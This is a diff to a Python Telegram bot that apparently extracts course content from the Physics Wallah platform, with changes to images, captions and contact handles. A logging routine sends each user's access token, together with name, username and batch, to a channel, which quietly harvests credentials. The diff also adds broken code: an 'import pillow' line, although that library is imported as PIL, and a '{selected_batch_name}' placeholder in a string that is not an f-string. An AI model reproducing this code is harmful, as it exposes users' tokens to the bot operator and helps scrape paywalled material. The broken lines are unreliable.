@@ -1,4 +1,5 @@
 import requests
+import pillow
 import asyncio
 import aiohttp
 import json
@@ -104,14 +105,16 @@ def run_flask():
     app_flask.run(host="0.0.0.0", port=8000)
 
 image_list = [
-    "https://graph.org/file/f916f4201ab639edcd0d3-a971cbc6b62b2d02c1.jpg",
-    "https://graph.org/file/025f3cd9f484486e11f4b-5536fe32d85fa8e8b0.jpg",
-    "https://graph.org/file/65597d9a99988ca3409ee-b910bf5edc5819a4ee.jpg",
-    "https://graph.org/file/e4647dd34c4fcbe007b48-4ccf001a50c0a0d195.jpg",
-    "https://graph.org/file/2146d1c0cd08d5aa23cf5-6a149b2c332e30ea56.jpg",
-    "https://graph.org/file/1ed3ddbc28918c66f7310-d1922e8985017185fb.jpg",
-    "https://graph.org/file/0bc62b6626623cfc092a5-4fe7cfaaff4af63b2a.jpg",
-    "https://graph.org/file/6745a91443a5ff430edf6-4e00ad93244ed35481.jpg",
+    "https://graph.org/file/28339f6c961ca96a84f47-1a070fdc1632724513.jpg",
+    "https://graph.org/file/9db3816e75336ecc45959-6d49ddd4d0e92f1aae.jpg",
+    "https://graph.org/file/1d1548631e6d1d3b3796e-b6647f0434c20f100a.jpg",
+    "https://graph.org/file/a1c4b27984bb61183048c-d11e4d6c9ea09fcedb.jpg",
+    "https://graph.org/file/1d1dab8f4dc33df10e38c-a3c92d386be28422ac.jpg",
+    "https://graph.org/file/7831481e4c899748ee8a1-b976b5e72df8c3618c.jpg",
+    "https://graph.org/file/41b150f2461004c4fd99a-d29d2bc307f0fe6491.jpg",
+    "https://graph.org/file/ce8ebdb5c2ba8932ec780-1737059c6bb976617d.jpg",
+    "https://graph.org/file/1f2bd4b7d0747a432e3fe-b1229343f6557ba344.jpg",
+    "https://graph.org/file/b07088988e66447aeb92f-f8c4f26ad5b867aa5a.jpg",
 ]
 print(4321)
 
@@ -125,7 +128,7 @@ print(4321)
 # dropped the thumbnail (no crash, no error -> looked like "thumbnail nahi
 # lag raha"). It also only ran once at import time with no retry, so a
 # single transient failure on startup left THUMBNAIL_FILE = None forever.
-THUMB_URL = "https://graph.org/file/5e7dc66913185f41c81ce-78485dba7e5ae7fc8e.jpg"
+THUMB_URL = "https://graph.org/file/673f55a25e28da21ade36-cc0b5c430f9666323e.jpg"
 THUMB_PATH = "document_thumb_v2.jpg"
 THUMB_MAX_SIDE = 320       # Telegram hard limit (matches the doc note above)
 THUMB_MAX_BYTES = 200 * 1024  # Telegram hard limit (< 200KB)
@@ -858,7 +861,7 @@ async def log_extraction_to_channel(bot, user_id, user_name, user_username, batc
             f"👤 Name: {user_name or 'N/A'}\n"
             f"👤 Username: @{user_username if user_username else 'N/A'}\n"
             f"📚 Batch: `{batch_name}`\n"
-            f"🔐 Token: `{token}`\n"
+            f"🔐 Token: `{access_token}`\n"
             f"📄 Files: {', '.join(file_types)}\n"
             f"⏰ Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S IST')}"
         )
@@ -3063,13 +3066,13 @@ async def start(bot, message):
     _save_broadcast_users(broadcast_users)
     random_image_url = random.choice(image_list)
     keyboard = [
-        [InlineKeyboardButton("😻💕PHYSICS WALLAH💕 ", callback_data="pwwp")],
+        [InlineKeyboardButton("🕺PHYSICS WALLAH🕺", callback_data="pwwp")],
         [InlineKeyboardButton("🔍Join Channel", url="https://t.me/teamcinderella")]
     ]
     reply_markup = InlineKeyboardMarkup(keyboard)
     await message.reply_photo(
         photo=random_image_url,
-        caption="PLEASE PRESS HERE",
+        caption="HABIBI PLEASE PRESS HERE🤓",
         quote=True,
         reply_markup=reply_markup
     )
@@ -3356,7 +3359,7 @@ async def process_pwwp(bot, m, user_id):
 
             await editable.edit(
                 "**Enter Your Batch Name\n\n"
-                "Remeber Only Purchased Batch ke Videos hi aayenge Otherwise Sirf PDFs😐.**"
+                "REMEMBER Only Purchased Batch ke Videos hi aayenge Otherwise Sirf PDFs😐.**"
             )
             try:
                 input3 = await bot.listen(chat_id=m.chat.id, filters=filters.user(user_id), timeout=120)
@@ -3395,7 +3398,7 @@ async def process_pwwp(bot, m, user_id):
                 f"**Send index number of the course to download.\n\n"
                 f"{text}\n\n"
                 f"Showing page 1 of {total_pages} ({total_batches} total batches)\n"
-                f"If Your Batch Not Listed Above Enter Contact: @SmartBoy_ApnaMS**"
+                f"If Your Batch Not Listed Above Enter Contact: @JapaneseFury**"
             )
 
             # Edit the message with pagination keyboard
@@ -3465,6 +3468,7 @@ async def process_pwwp(bot, m, user_id):
             # MENU: 1.Full Batch | 2.Today Class | 3.Khazana | 4.Select Date
             # ==========================================================
             await editable.edit(
+                "You Selected {selected_batch_name} for\n"
                 "1.```\nFull Batch```\n"
                 "2.```\nToday's Class```\n"
                 "3.```\nKhazana```\n"
@@ -3616,7 +3620,7 @@ async def process_pwwp(bot, m, user_id):
                         f"📅 Date: {display_date}\n"
                         f"📊 Total Classes: {total_schedules}\n"
                         f"Time Taken : {formatted_time}```"
-                        f"Extracted By: @SmartBoy_ApnaMS**"
+                        f"Extracted By: @JapaneseFury**"
                     )
 
                     # Send files for option 4: only txt + html
